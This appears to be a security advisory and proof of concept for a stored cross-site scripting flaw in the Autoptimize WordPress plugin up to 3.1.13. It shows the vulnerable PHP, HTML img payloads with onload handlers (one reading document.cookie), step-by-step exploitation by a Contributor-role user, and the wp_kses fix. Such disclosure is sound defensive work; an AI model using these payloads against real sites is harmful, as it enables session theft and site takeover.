# Proof of Concept: Stored XSS in Autoptimize < 3.1.14

**Vulnerability**: Authenticated (Contributor+) Stored Cross-Site Scripting (XSS)
**Affected Version**: Autoptimize <= 3.1.13
**Patched Version**: Autoptimize 3.1.14
**File**: `classes/autoptimizeImages.php`

## Description
The vulnerability exists in the `create_img_preload_tag()` method within `classes/autoptimizeImages.php`. This function is responsible for generating `<link rel="preload">` tags for images found in the content when image optimization or preloading is enabled.

In version 3.1.13, the function uses a "blacklist" approach (via `preg_replace`) to remove specific attributes like `title`, `alt`, `class`, `id`, `width`, and `height` from the original `<img>` tag before converting it to a `<link>` tag. However, it fails to remove event handler attributes such as `onload` or `onerror`.

An authenticated attacker (with at least Contributor role) can embed a malicious `<img>` tag in a post. When the plugin processes this post to generate preload links, the malicious event handler is preserved and injected into the `<head>` of the page inside a `<link>` tag. Since `<link rel="preload">` supports the `onload` event, the JavaScript executes when the resource is loaded.

## Vulnerable Code (v3.1.13)
```php
// classes/autoptimizeImages.php

public static function create_img_preload_tag( $tag ) {
    // ...
    // rewrite img tag to link preload img.
    $_from = array( '<img ', ' src=', ' sizes=', ' srcset=' );
    $_to   = array( '<link rel="preload" as="image" ', ' href=', ' imagesizes=', ' imagesrcset=' );
    $tag   = str_replace( $_from, $_to, $tag );

    // INSUFFICIENT SANITIZATION: Only removes specific attributes
    $tag = preg_replace( '/ ((?:title|alt|class|id|loading|fetchpriority|decoding|data-no-lazy|width|height)=".*")/Um', '', $tag );
    // ...
    return $tag;
}
```

## Proof of Concept Steps

### Prerequisites
1.  Install Autoptimize version 3.1.13.
2.  Enable "Optimize Images" or ensure image preloading is active (e.g., via "Preload specific requests" or default behaviors acting on images).
    *   *Note: The vulnerable function `create_img_preload_tag` is often triggered for images detected in the viewport or explicitly preloaded.*

### Payload
```html
<img src="https://example.com/image.jpg" onload="alert('XSS_POC_SUCCESS')">
```

### Exploitation
1.  Login as a user with **Contributor** role (or higher).
2.  Create a new Post.
3.  Inject the payload into the post content (using the Custom HTML block or Code editor).
    ```html
    <!-- Malicious Image -->
    <img src="/wp-content/plugins/autoptimize/classes/external/js/lazysizes.min.js" onload="alert(document.cookie)">
    ```
    *(Using a local resource often ensures the load event fires quickly. Any valid image URL works.)*
4.  Save the post.
5.  Wait for an Administrator to view the post (or view it yourself).
6.  The Autoptimize plugin will parse the `<img>` tag.
7.  It will generate a preload link in the HTML source:
    ```html
    <link rel="preload" as="image" href="/wp-content/plugins/autoptimize/classes/external/js/lazysizes.min.js" onload="alert(document.cookie)">
    ```
    *Note: The attributes `width`, `height`, etc. might be stripped, but `onload` remains.*
8.  The browser parses the `<link>` tag, preloads the resource, and fires the `onload` event, executing the XSS.

## Fix in v3.1.14
The patch replaces the blacklist regex with `wp_kses()`, enabling a strict whitelist of allowed attributes for the generated `<link>` tag.

```php
// classes/autoptimizeImages.php v3.1.14

$allowed_html = array(
    'link' => array(
        'rel'           => true,
        'as'            => true,
        'href'          => true,
        'imagesizes'    => true,
        'imagesrcset'   => true,
        'type'          => true,
        'media'         => true,
    ),
);
$tag = wp_kses( $tag, $allowed_html );
```
